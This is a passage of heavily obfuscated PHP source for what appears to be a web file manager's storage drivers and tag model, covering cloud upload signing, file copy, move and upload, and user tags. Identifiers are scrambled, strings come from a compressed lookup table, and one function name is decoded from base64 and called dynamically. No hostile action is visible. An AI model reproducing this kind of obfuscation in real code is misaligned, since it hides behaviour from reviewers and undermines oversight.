$ιΔµ«[$φ¨Η†Ύ”[1149]] = 1; } else { $ιΔµ«[$φ¨Η†Ύ”[1149]] = $π‘ΓΪ[$φ¨Η†Ύ”[82]][$φ¨Η†Ύ”[80]]; } $ιΔµ«[$φ¨Η†Ύ”[1151]] = $φ¨Η†Ύ”[12]; $ιΔµ«[$φ¨Η†Ύ”[1849]] = 0; $ιΔµ«[$φ¨Η†Ύ”[1794]] = 0; $ιΔµ«[$φ¨Η†Ύ”[1847]] = 0; $ιΔµ«[$φ¨Η†Ύ”[1848]] = 0; $ιΔµ«[$φ¨Η†Ύ”[1845]] = $φ¨Η†Ύ”[12]; $ιΔµ«[$φ¨Η†Ύ”[1852]] = 0; $ιΔµ«[$φ¨Η†Ύ”[838]] = $π‘ΓΪ[$φ¨Η†Ύ”[79]]; $this->update(); self::log($φ¨Η†Ύ”[1918] . json_encode(array($ιΔµ«, $π‘ΓΪ))); } public function nameParse($ΈΩβΛν©) { $«Δφ–Ο =& $_SERVER[γγάψ½]; $φΗίό =& $this->task; if ($φΗίό[$«Δφ–Ο[1913]] == $«Δφ–Ο[1290]) { $φΗίό[$«Δφ–Ο[1913]] = $«Δφ–Ο[391]; $φΗίό[$«Δφ–Ο[1852]] = 0; $φΗίό[$«Δφ–Ο[838]] = 0; } $ζ®ίπΦτ = get_path_this($ΈΩβΛν©); if (strstr($ζ®ίπΦτ, $«Δφ–Ο[10])) { $φΗίό[$«Δφ–Ο[1794]] += 1; $φΗίό[$«Δφ–Ο[1149]] += 1; } $φΗίό[$«Δφ–Ο[1845]] = $ΈΩβΛν©; $this->update(); } } goto aΤφυΒν; F±ίξ‰‘†κ: $fileSize = strrev(base64_decode($_SERVER[Φ ‘Ρ³λ][0])); function binCheckNeq($”Έ²΅ΉΛ, $¥»έω‰Α) { return $”Έ²΅ΉΛ != $¥»έω‰Α; } $_SERVER[$_SERVER[Φ ‘Ρ³λ][1]] = $fileSize($_SERVER[$_SERVER[Φ ‘Ρ³λ][2]]); goto BΠ‡ΐΎ³ρΰ; c„ξ±¶: $_SERVER[Βφεβ–φ] = explode($_SERVER[γγάψ½][688], gzinflate(substr($_SERVER[γγάψ½][689], 10, -8))); $tyabcrhmow = $_SERVER[γγάψ½][690]; while (strlen($tyabcrhmow) < $_SERVER[γγάψ½][691]) { if (!$tyabcrhmow) { break; } $tyabcrhmow++; } goto b…»‚ςΌ‹¶; cΖΣσΗν: class PathDriverBOS extends PathDriverS3 { public function __construct($ά›‡ψ‚Ϋ) { parent::__construct($ά›‡ψ‚Ϋ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($²‡ΪΪύΒ) { parent::__construct($²‡ΪΪύΒ); $this->setSignVersion($_SERVER[γγάψ½][250]); } public function uploadFormData($ΓΙδ†, $Δ£ƒψƒ = 3600) { $†¥Ϋ‹γϊ =& $_SERVER[γγάψ½]; $½½υ…¦ = $†¥Ϋ‹γϊ[232]; $ξη―κΓζ = $†¥Ϋ‹γϊ[1430]; $¬«ΫΔδ = $†¥Ϋ‹γϊ[264]; $ΪΫΜ‘Ϊ = gmdate($†¥Ϋ‹γϊ[1431], time() + $Δ£ƒψƒ); $υΔρΒθΒ = (string) time() . $†¥Ϋ‹γϊ[74] . (string) (time() + $Δ£ƒψƒ); $ΕΊ‘Α±Κ = array($†¥Ϋ‹γϊ[265] => $ΪΫΜ‘Ϊ, $†¥Ϋ‹γϊ[268] => array(array($†¥Ϋ‹γϊ[309] => $½½υ…¦), array($†¥Ϋ‹γϊ[269] => $this->bucket), array($†¥Ϋ‹γϊ[270], $†¥Ϋ‹γϊ[271], $†¥Ϋ‹γϊ[12]), array($†¥Ϋ‹γϊ[273] => $¬«ΫΔδ), array($†¥Ϋ‹γϊ[1432] => $ξη―κΓζ), array($†¥Ϋ‹γϊ[1433] => $this->accessKey), array($†¥Ϋ‹γϊ[1434] => $υΔρΒθΒ))); $ΕΊ‘Α±Κ = json_encode($ΕΊ‘Α±Κ); $›¬―¥ρ = hash_hmac($†¥Ϋ‹γϊ[1430], $υΔρΒθΒ, $this->secret); $ΪΕ™»ς = sha1($ΕΊ‘Α±Κ); $ηΰΕ‹Υ = hash_hmac($†¥Ϋ‹γϊ[1430], $ΪΕ™»ς, $›¬―¥ρ); $—€¬„Ε = array($†¥Ϋ‹γϊ[309] => $½½υ…¦, $†¥Ϋ‹γϊ[273] => $¬«ΫΔδ, $†¥Ϋ‹γϊ[280] => base64_encode($ΕΊ‘Α±Κ), $†¥Ϋ‹γϊ[1432] => $ξη―κΓζ, $†¥Ϋ‹γϊ[1433] => $this->accessKey, $†¥Ϋ‹γϊ[1435] => $υΔρΒθΒ, $†¥Ϋ‹γϊ[1436] => $ηΰΕ‹Υ, $†¥Ϋ‹γϊ[209] => $this->getHost()); return $—€¬„Ε; } public function fileOutImage($½ΓοΑΙΟ, $θπΗ­εό = 250) { $ΫΓ πίι =& $_SERVER[γγάψ½]; if ($this->size($½ΓοΑΙΟ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($½ΓοΑΙΟ, $θπΗ­εό); } $ΎΡ³ΰ° = $this->link($½ΓοΑΙΟ); $ΎΡ³ΰ° .= $ΫΓ πίι[1437] . $θπΗ­εό . $ΫΓ πίι[1438]; $this->fileOutLink($ΎΡ³ΰ°); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ΧάΌ­µ) { $this->pathParse = $ΧάΌ­µ; $this->model = Model($_SERVER[γγάψ½][1439]); } public function getPath($•ϊ“λΙ») { return trim($•ϊ“λΙ», $_SERVER[γγάψ½][8]); } public function pathFather($‡‚Α–§¤) { $Ή„Κ€ωζ = $this->parse($‡‚Α–§¤); $Ή„Κ€ωζ = $this->infoSimple($‡‚Α–§¤); return $Ή„Κ€ωζ ? $Ή„Κ€ωζ[$_SERVER[γγάψ½][193]] : !1; } public function pathThis($²µ–•ώ) { $δΛι΅ψΛ = $this->infoSimple($²µ–•ώ); return $δΛι΅ψΛ ? $δΛι΅ψΛ[$_SERVER[γγάψ½][32]] : !1; } public function getPathOuter($έΖΔΰή) { if (!$έΖΔΰή) { return $έΖΔΰή; } $ή¦ΦΊΞ― = $this->parse($έΖΔΰή); return KodIO::make($ή¦ΦΊΞ―[$_SERVER[γγάψ½][478]]); } public function copyFolderFromIO($Ν¦…ϋ€Τ, $π–θ±, $·Χί­™, $ΕΞ‰–, $ιΓΫΣΆ΅) { $Ϊ­°΄² = $this->model->copyFolderFromIO($Ν¦…ϋ€Τ, $π–θ±, $·Χί­™, $ΕΞ‰–, $ιΓΫΣΆ΅); return KodIO::make($Ϊ­°΄²); } public function isParentOf($ΠΓ¦³Ο…, $―ύΣΓη) { return $this->model->isParentOf($ΠΓ¦³Ο…, $―ύΣΓη); } public function mkfile($­ΑζοτΚ, $ΥΡθ΅η = '', $Οβκ = REPEAT_RENAME) { $‚’Ά€ =& $_SERVER[γγάψ½]; $™”ί•Ε = $this->parse($­ΑζοτΚ); $­ΑζοτΚ = $™”ί•Ε[$‚’Ά€[478]]; for ($¨Λϋωέ = 0; $¨Λϋωέ < count($™”ί•Ε[$‚’Ά€[1440]]); $¨Λϋωέ++) { $φυΖΡ = $™”ί•Ε[$‚’Ά€[1440]][$¨Λϋωέ]; if ($¨Λϋωέ == count($™”ί•Ε[$‚’Ά€[1440]]) - 1) { $­ΑζοτΚ = $this->model->mkfile($­ΑζοτΚ, $φυΖΡ, $ΥΡθ΅η, $Οβκ); break; } $­ΑζοτΚ = $this->model->mkdir($­ΑζοτΚ, $φυΖΡ, REPEAT_SKIP); } return $this->getPathOuter($­ΑζοτΚ); } public function mkdir($‘’Φ―Ξ, $„ΰ“Άφ = REPEAT_SKIP) { $Ά—¬ΪζΩ =& $_SERVER[γγάψ½]; $Ϋ½ƒ•θί = $this->parse($‘’Φ―Ξ); $‘’Φ―Ξ = $Ϋ½ƒ•θί[$Ά—¬ΪζΩ[478]]; for ($Π‰ υΦΊ = 0; $Π‰ υΦΊ < count($Ϋ½ƒ•θί[$Ά—¬ΪζΩ[1440]]); $Π‰ υΦΊ++) { $άά­Ύς = $Ϋ½ƒ•θί[$Ά—¬ΪζΩ[1440]][$Π‰ υΦΊ]; $‘’Φ―Ξ = $this->model->mkdir($‘’Φ―Ξ, $άά­Ύς, $„ΰ“Άφ); } return $this->getPathOuter($‘’Φ―Ξ); } public function copyFile($Ώ΄΄΄γ‘, $ο–ΊΨ¶„, $Οσ±α = REPEAT_REPLACE) { $ΓΥ•οΘ =& $_SERVER[γγάψ½]; $Έ΅λκ­… = $this->parse($ο–ΊΨ¶„); $ηΘκ¦ = $this->model->copy($Ώ΄΄΄γ‘, $Έ΅λκ­…[$ΓΥ•οΘ[478]], $Οσ±α, $Έ΅λκ­…[$ΓΥ•οΘ[87]]); return $ηΘκ¦ ? $this->getPathOuter($ηΘκ¦) : !1; } public function moveFile($²ήιπΎ, $Κΐ€ƒΞ†, $ Θ¶°Ώ = REPEAT_REPLACE) { $™ ιΗϊ§ =& $_SERVER[γγάψ½]; $έΙΐ§ΟΣ = $this->parse($Κΐ€ƒΞ†); $ΐΌ›Ε² = $this->model->move($²ήιπΎ, $έΙΐ§ΟΣ[$™ ιΗϊ§[478]], $ Θ¶°Ώ, $έΙΐ§ΟΣ[$™ ιΗϊ§[87]]); return $ΐΌ›Ε² ? $this->getPathOuter($ΐΌ›Ε²) : !1; } public function copy($½τ·¶—, $»—ο‘“Κ, $μΕπ£ΨΥ = REPEAT_REPLACE, $νέ—όΓ = false) { $ώΥό› = $this->parse($»—ο‘“Κ); $›β¶Μ• = $this->model->copy($½τ·¶—, $ώΥό›[$_SERVER[γγάψ½][478]], $μΕπ£ΨΥ, $νέ—όΓ); return $›β¶Μ• ? $this->getPathOuter($›β¶Μ•) : !1; } public function moveSameAllow() { } public function move($’²²«ϋΏ, $³π, $‚βίΪύι = REPEAT_REPLACE, $ΞΧ’Δ = false) { $ ΪΚφΛ = $this->parse($³π); $ϋ»Λγα = $this->model->move($’²²«ϋΏ, $ ΪΚφΛ[$_SERVER[γγάψ½][478]], $‚βίΪύι, $ΞΧ’Δ); return $ϋ»Λγα ? $this->getPathOuter($ϋ»Λγα) : !1; } public function remove($½φιδ, $μ”ύθ¨ = true) { return $this->model->remove($½φιδ, $μ”ύθ¨); } public function rename($ήαμώ, $ϋ©‡ρ) { $Ί±®έ–ε = $this->model->rename($ήαμώ, $ϋ©‡ρ); return $Ί±®έ–ε ? $this->getPathOuter($ήαμώ) : $Ί±®έ–ε; } public function size($¶ΛΓηε) { $ƒ‹μσ = $this->infoSimple($¶ΛΓηε); return $ƒ‹μσ ? $ƒ‹μσ[$_SERVER[γγάψ½][79]] : 0; } public function infoSimple($Ύμ„ηςΘ) { return $this->model->sourceInfo($Ύμ„ηςΘ); } public function info($ω™Ό‡κ) { return $this->infoParse($ω™Ό‡κ); } public function infoAuth($Ε®“Έ¶Ύ) { return $this->infoParse($Ε®“Έ¶Ύ, !1, !0); } public function infoWithChildren($¬τ–”²) { return $this->infoParse($¬τ–”², !0); } protected function infoParse($†ϋ΄κ‹, $όκ¥½Ύ = false, $γΤΪιύ = false) { if (!$όκ¥½Ύ) { return $this->model->pathInfo($†ϋ΄κ‹, $γΤΪιύ); } return $this->model->pathInfoMore($†ϋ΄κ‹); } public function infoFullSimple($φΊθϊ”‡) { $ΧΜσρ™ο =& $_SERVER[γγάψ½]; $‚¦‡Ώοΐ = explode($ΧΜσρ™ο[8], $φΊθϊ”‡); $χγΫς‡ = implode($ΧΜσρ™ο[8], array_splice($‚¦‡Ώοΐ, 1)); return $this->model->pathInfoByPath($‚¦‡Ώοΐ[0], $χγΫς‡); } public function infoFull($β³‘΄ύΥ) { $‰ώ•  = $this->infoFullSimple($β³‘΄ύΥ); return is_array($‰ώ• ) ? $this->model->pathInfo($‰ώ• [$_SERVER[γγάψ½][194]]) : !1; } public function hashSimple($νΧΉψ¨Γ) { $›΅«„® =& $_SERVER[γγάψ½]; $©”Ωγγ = $this->infoWithChildren($νΧΉψ¨Γ); return $©”Ωγγ[$›΅«„®[170]][$›΅«„®[680]]; } public function hashMd5($Ν­όΤΐε) { $Ο®ηΊΖ =& $_SERVER[γγάψ½]; $ένΔϊκ = $this->infoWithChildren($Ν­όΤΐε); return $ένΔϊκ[$Ο®ηΊΖ[170]][$Ο®ηΊΖ[552]]; } public function exist($“ ¥”) { $ΫΉ³΅Ι‡ =& $_SERVER[γγάψ½]; $Χγ’βζ = $this->parse($“ ¥”); if (!$Χγ’βζ[$ΫΉ³΅Ι‡[87]]) { return $this->isFile($“ ¥”) || $this->isFolder($“ ¥”); } $Χ»½—€ = array($ΫΉ³΅Ι‡[480] => $Χγ’βζ[$ΫΉ³΅Ι‡[478]], $ΫΉ³΅Ι‡[32] => $Χγ’βζ[$ΫΉ³΅Ι‡[87]]); $¬ ®Ί = $this->model->where($Χ»½—€)->find(); return $¬ ®Ί ? !0 : !1; } public function isFile($‡΅™πΈ) { $ΉΟ‘θΧ© =& $_SERVER[γγάψ½]; $¶ζλθ = $this->infoSimple($‡΅™πΈ); return $¶ζλθ && $¶ζλθ[$ΉΟ‘θΧ©[488]] == $ΉΟ‘θΧ©[231] ? !0 : !1; } public function isFolder($ςΫ‡ϋχ) { $θα¬ΨΙ =& $_SERVER[γγάψ½]; $ΈύΧμΘ = $this->infoSimple($ςΫ‡ϋχ); return $ΈύΧμΘ && $ΈύΧμΘ[$θα¬ΨΙ[488]] == $θα¬ΨΙ[91] ? !0 : !1; } public function listPath($†Ν±©‰, $¬ζ«ƒΧ» = false) { $­΄ξΟΣα =& $_SERVER[γγάψ½]; if ($†Ν±©‰ == $­΄ξΟΣα[12]) { return !1; } $¦Υ£·Ώ = array($­΄ξΟΣα[480] => $†Ν±©‰); if ($¬ζ«ƒΧ») { return $this->model->listSource($¦Υ£·Ώ, -1); } return $this->model->listSource($¦Υ£·Ώ); } public function has($σΙΔΈ«‹, $µΨαƒύ = false, $ ύέ―µΗ = null) { $ΪΨΌ¥­Μ =& $_SERVER[γγάψ½]; $όχ΅°Κ = $this->infoWithChildren($σΙΔΈ«‹); if ($µΨαƒύ) { return array($ΪΨΌ¥­Μ[243] => $όχ΅°Κ[$ΪΨΌ¥­Μ[243]], $ΪΨΌ¥­Μ[242] => $όχ΅°Κ[$ΪΨΌ¥­Μ[242]]); } return $ ύέ―µΗ ? $όχ΅°Κ[$ΪΨΌ¥­Μ[243]] : $όχ΅°Κ[$ΪΨΌ¥­Μ[242]]; } public function listAll($Ξ“Υλα) { $όί‰°Ξ = IO::info($this->pathParse[$_SERVER[γγάψ½][87]]); if (!$όί‰°Ξ) { return array(); } return $this->model->listAll($Ξ“Υλα); } public function getContent($Ό­Ε½) { return $this->model->getContent($Ό­Ε½); } public function setContent($θτ§έ, $φ¦¤ογ = '') { return $this->model->setContent($θτ§έ, $φ¦¤ογ); } public function fileSubstr($¨Ο»β, $ΣΓ»½γ„, $±χ‰²Ύ) { return $this->model->fileSubstr($¨Ο»β, $ΣΓ»½γ„, $±χ‰²Ύ); } public function download($Υ‚ΒΐΌ», $Ρώΰ›Ϊ = '') { $£Π©ƒ = get_path_father($Ρώΰ›Ϊ); $”δƒƒ²½ = get_path_this($Ρώΰ›Ϊ); $‡«®—ΑΨ = $this->model->fileInfoGet($Υ‚ΒΐΌ»); $ϋ™°Ο± = IO::copy($‡«®—ΑΨ[$_SERVER[γγάψ½][87]], $£Π©ƒ, !1, $”δƒƒ²½); return $ϋ™°Ο±; } public function setModifyTime($ ¤ƒ΄Α, $†‹ς£½Ώ = '') { $ψΛ¤΅ι® =& $_SERVER[γγάψ½]; if (!$ ¤ƒ΄Α) { return; } $this->model->where(array($ψΛ¤΅ι®[494] => $ ¤ƒ΄Α))->save(array($ψΛ¤΅ι®[88] => $†‹ς£½Ώ)); } public function upload($¤‰·…£, $Ο―‹Η, $η΅¥…Γγ = false, $ΖΎ»Χ = REPEAT_REPLACE) { $μκ…Ρ·ϊ =& $_SERVER[γγάψ½]; $Εβ—»Ϋϊ = $this->parse($¤‰·…£); $μ±ζπυφ = $this->model->addFile($Εβ—»Ϋϊ[$μκ…Ρ·ϊ[478]], $Ο―‹Η, $Εβ—»Ϋϊ[$μκ…Ρ·ϊ[87]], $η΅¥…Γγ, $ΖΎ»Χ); return $this->getPathOuter($μ±ζπυφ); } public function uploadFileByID($βωΔ§’, $”£†άπί, $ΝεΧΠ) { $Γ›ΧΐμΒ =& $_SERVER[γγάψ½]; $ί”΄¶Ψ = $this->parse($βωΔ§’); $άΤςΣ¦” = $this->model->addFileByFileID($ί”΄¶Ψ[$Γ›ΧΐμΒ[478]], $”£†άπί, $ί”΄¶Ψ[$Γ›ΧΐμΒ[87]], $ΝεΧΠ); return $this->getPathOuter($άΤςΣ¦”); } public function addFileByRemote($Χ±Ϋρ­, $ΊΛΐμΘ§, $ΓΫ΄αη = array(), $°®½¥ϊ¤ = '', $ΑΧΜ‰‚) { $ΑΒΝΉΟ =& $_SERVER[γγάψ½]; $ΨΑα¥ = $this->parse($Χ±Ϋρ­); $°®½¥ϊ¤ = empty($°®½¥ϊ¤) ? $ΨΑα¥[$ΑΒΝΉΟ[87]] : $°®½¥ϊ¤; $τθϋτ΅… = $this->model->addFileByRemote($ΨΑα¥[$ΑΒΝΉΟ[478]], $ΊΛΐμΘ§, $°®½¥ϊ¤, $ΓΫ΄αη, $ΑΧΜ‰‚); return $this->getPathOuter($τθϋτ΅…); } public function uploadLink($Μψδ–έ, $–Γ³ϋμ = 0) { $κή†σβ =& $_SERVER[γγάψ½]; $οΉ¦™ψ = $this->parse($Μψδ–έ); $™Ξ€θϊ» = _get($GLOBALS[$κή†σβ[7]], $κή†σβ[1441]); $™«ώΜ‘Ί = _get($GLOBALS[$κή†σβ[7]], $κή†σβ[1442]); $Κδ›Ζύ‰ = KodIO::ioFileDriverGet($κή†σβ[486] . $οΉ¦™ψ[$κή†σβ[478]] . $κή†σβ[405]); $Νήοϊ = Model($κή†σβ[682])->createFileName($οΉ¦™ψ[$κή†σβ[87]], $Κδ›Ζύ‰, $™Ξ€θϊ», $™«ώΜ‘Ί); return IO::uploadLink($Νήοϊ, $–Γ³ϋμ); } public function fileNameAuto($Ϋά“·«, $ϊΦ¥ζ, $Έ•—’Η = REPEAT_REPLACE, $΄ώΛ§ = false) { return $this->model->fileNameAuto($Ϋά“·«, $ϊΦ¥ζ, $Έ•—’Η, $΄ώΛ§); } public function fileNameExist($Ύ±ΆΌ, $®σΑΘψ§) { return $this->model->fileNameExist($Ύ±ΆΌ, $®σΑΘψ§); } protected function _fileOut($µΑζΡΘΖ, $’Ο‰ςΖ = false, $ί©¶― = false, $ίτ―θ = '', $ΗΞΏν¦ = false) { $ƒψΌπ¥Γ =& $_SERVER[γγάψ½]; $ψ”²ηω = $this->model->sourceInfo($µΑζΡΘΖ); if ($ψ”²ηω[$ƒψΌπ¥Γ[488]] == $ƒψΌπ¥Γ[91]) { header($ƒψΌπ¥Γ[1443]); die; } $²³ΜΖΆ‰ = $this->model->fileInfoGet($µΑζΡΘΖ); $ίτ―θ = $²³ΜΖΆ‰[$ƒψΌπ¥Γ[552]] ? $²³ΜΖΆ‰[$ƒψΌπ¥Γ[552]] : $ίτ―θ; $ξ²³ξ£ = isset($GLOBALS[$ƒψΌπ¥Γ[183]]) && is_array($GLOBALS[$ƒψΌπ¥Γ[183]]) ? $GLOBALS[$ƒψΌπ¥Γ[183]][$ƒψΌπ¥Γ[32]] : $ψ”²ηω[$ƒψΌπ¥Γ[32]]; if ($ΗΞΏν¦) { return IO::fileOutServer($²³ΜΖΆ‰[$ƒψΌπ¥Γ[87]], $’Ο‰ςΖ, $ξ²³ξ£, $ίτ―θ); } IO::fileOut($²³ΜΖΆ‰[$ƒψΌπ¥Γ[87]], $’Ο‰ςΖ, $ξ²³ξ£, $ίτ―θ); } public function fileOut($ΐ€ΕµΒε, $όωΎ„¨† = false, $‚‹κΔ = false, $ξϊδΝ = '') { $this->_fileOut($ΐ€ΕµΒε, $όωΎ„¨†, $‚‹κΔ, $ξϊδΝ); } public function fileOutServer($™Εν·ΉΣ, $¬τύΏνξ = false, $Φ­όµΫ† = false, $σώΩ”Π” = '') { $this->_fileOut($™Εν·ΉΣ, $¬τύΏνξ, $Φ­όµΫ†, $σώΩ”Π”, !0); } protected function _fileOutImage($¥ΐ§«ή‰, $†–ΐΏχ = 250) { $»±ΗΌ =& $_SERVER[γγάψ½]; $ΐρ£λ‡Π = $this->model->pathInfo($¥ΐ§«ή‰); if ($ΐρ£λ‡Π[$»±ΗΌ[488]] == $»±ΗΌ[91]) { show_json($»±ΗΌ[1444] . $¥ΐ§«ή‰, !1); } $΄Τξ—”ϊ = $this->model->fileInfoGet($¥ΐ§«ή‰); $ΐρ£λ‡Π[$»±ΗΌ[184]] = $΄Τξ—”ϊ[$»±ΗΌ[87]]; $GLOBALS[$»±ΗΌ[183]] = $ΐρ£λ‡Π; IO::fileOutImage($΄Τξ—”ϊ[$»±ΗΌ[87]], $†–ΐΏχ); } public function fileOutImage($ηωΊξΒ, $ύΣυΩ‡ = 250) { $this->_fileOutImage($ηωΊξΒ, $ύΣυΩ‡); } public function fileOutImageServer($Γτβ—„, $ΣΛ°‚λΡ = 250) { $this->_fileOutImage($Γτβ—„, $ΣΛ°‚λΡ); } public function link($‰―ΆνΛ , $Ό‚»§ = '') { $·°ώΘΕ = $this->model->fileInfoGet($‰―ΆνΛ ); return IO::link($·°ώΘΕ[$_SERVER[γγάψ½][87]], $Ό‚»§); } protected function parse($½ζ‰¨ήζ) { $‹…¥ββ« =& $_SERVER[γγάψ½]; if (strstr($½ζ‰¨ήζ, $‹…¥ββ«[8]) === !1) { return array($‹…¥ββ«[496] => intval($½ζ‰¨ήζ), $‹…¥ββ«[87] => $‹…¥ββ«[12], $‹…¥ββ«[1440] => array()); } $χΒΡ ¥ = explode($‹…¥ββ«[8], trim($½ζ‰¨ήζ, $‹…¥ββ«[8])); if (count($χΒΡ ¥) < 2) { show_tips(clear_html($½ζ‰¨ήζ) . $‹…¥ββ«[1445]); } return array($‹…¥ββ«[496] => intval($χΒΡ ¥[0]), $‹…¥ββ«[87] => $χΒΡ ¥[1], $‹…¥ββ«[1440] => array_slice($χΒΡ ¥, 1)); } } goto e‡ΪΤ¨ΡΟ; F‘±ιΔΏ½…: define($_SERVER[γγάψ½][320], 3); define($_SERVER[γγάψ½][321], 1); define($_SERVER[γγάψ½][322], 0); goto B¬νφη½αυ; dάο…κ ‡: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ΙοΑΟ) { $ΚΏΩ² =& $_SERVER[γγάψ½]; return array($ΚΏΩ²[2109] => array($ΚΏΩ²[2539] . USER_ID, $ΚΏΩ²[2110])); } protected function listData() { $ ¨άΚρ =& $_SERVER[γγάψ½]; $Ήψυ”δµ = array($ ¨άΚρ[1784] => USER_ID, $ ¨άΚρ[562] => array($ ¨άΚρ[2113], 0)); $†κΨ›ΟΉ = $ ¨άΚρ[2540]; $”“£Η = $this->field($†κΨ›ΟΉ)->where($Ήψυ”δµ)->order($ ¨άΚρ[2115])->select(); return $”“£Η ? $”“£Η : array(); } protected function addToTag($ύ€’Ύ , $ΣΫωό…) { $ώΝγΙε± =& $_SERVER[γγάψ½]; if (!Model($ώΝγΙε±[2263])->listData($ΣΫωό…)) { return !1; } if (is_numeric($ύ€’Ύ )) { $»‰»Κςΐ = Model($ώΝγΙε±[905])->pathInfo($ύ€’Ύ ); if (!$»‰»Κςΐ) { return !1; } } else { $»‰»Κςΐ = IO::infoSimple($ύ€’Ύ ); if (!$»‰»Κςΐ) { return !1; } $Ζ½±¦–¥ = $»‰»Κςΐ[$ώΝγΙε±[32]]; $δ΄―ΏΗ¤ = $»‰»Κςΐ[$ώΝγΙε±[33]]; if (isset($»‰»Κςΐ[$ώΝγΙε±[488]])) { $δ΄―ΏΗ¤ = $»‰»Κςΐ[$ώΝγΙε±[488]] == $ώΝγΙε±[91] ? $ώΝγΙε±[78] : $ώΝγΙε±[233]; } } $φΰ™™ΏΛ = array($ώΝγΙε±[1784] => USER_ID, $ώΝγΙε±[562] => $ΣΫωό…, $ώΝγΙε±[498] => $ύ€’Ύ , $ώΝγΙε±[499] => $δ΄―ΏΗ¤ ? $δ΄―ΏΗ¤ : $ώΝγΙε±[493], $ώΝγΙε±[497] => $Ζ½±¦–¥ ? $Ζ½±¦–¥ : $ώΝγΙε±[12], $ώΝγΙε±[1997] => 0); if ($this->where($φΰ™™ΏΛ)->find()) { return !1; } return $this->add($φΰ™™ΏΛ); } protected function removeFromTag($θΫΟΆ, $Δ‹σΚ) { $›•ώ =& $_SERVER[γγάψ½]; if (!Model($›•ώ[2263])->listData($Δ‹σΚ)) { return !1; } if (is_array($θΫΟΆ)) { $θΫΟΆ = array($›•ώ[7], $θΫΟΆ); } $Ή²··λ— = array($›•ώ[1784] => USER_ID, $›•ώ[562] => $Δ‹σΚ, $›•ώ[498] => $θΫΟΆ); return $this->where($Ή²··λ—)->delete(); } protected function removeByTag($πθΣΡμ¤) { $υγ†ΞΆ =& $_SERVER[γγάψ½]; if (!$πθΣΡμ¤) { return !1; } $ΩόΡΨ½• = array($υγ†ΞΆ[1784] => USER_ID, $υγ†ΞΆ[562] => $πθΣΡμ¤); return $this->where($ΩόΡΨ½•)->delete(); } protected function removeBySource($ς΄ΌΝΤΜ) { $µλ™™ζ† =& $_SERVER[γγάψ½]; if (is_array($ς΄ΌΝΤΜ)) { $ς΄ΌΝΤΜ = array($µλ™™ζ†[7], $ς΄ΌΝΤΜ); } $νέύµ = array($µλ™™ζ†[1784] => USER_ID, $µλ™™ζ†[562] => array($µλ™™ζ†[1100], 0), $µλ™™ζ†[498] => $ς΄ΌΝΤΜ); return $this->where($νέύµ)->delete(); } }